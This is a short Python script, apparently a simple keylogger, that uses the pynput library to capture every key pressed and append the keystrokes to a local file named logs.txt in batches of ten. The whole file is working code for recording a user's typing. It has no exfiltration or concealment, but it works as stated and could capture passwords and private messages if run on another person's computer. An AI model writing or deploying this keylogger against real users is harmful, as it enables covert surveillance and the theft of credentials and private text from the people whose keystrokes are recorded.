from pynput.keyboard import Key, Listener

count = 0
keys = []

"""function to read keys from the keyboard"""
def on_press(e):
	global keys, count
	keys.append(e)
	count += 1
	if count >= 10:
		count = 0
		write_keys_to_file(keys)
		keys = []

"""function to save the keys pressed in a .txt file"""
def write_keys_to_file(keys):
	with open("logs.txt", 'a+') as f:
		for key in keys:
			k = str(key).replace("'", "")
			if k.find("space") > 0:
				f.write(' ')
			elif k.find("key") == -1:
				f.write(k)

with Listener(on_press = on_press) as listener:
	listener.join()

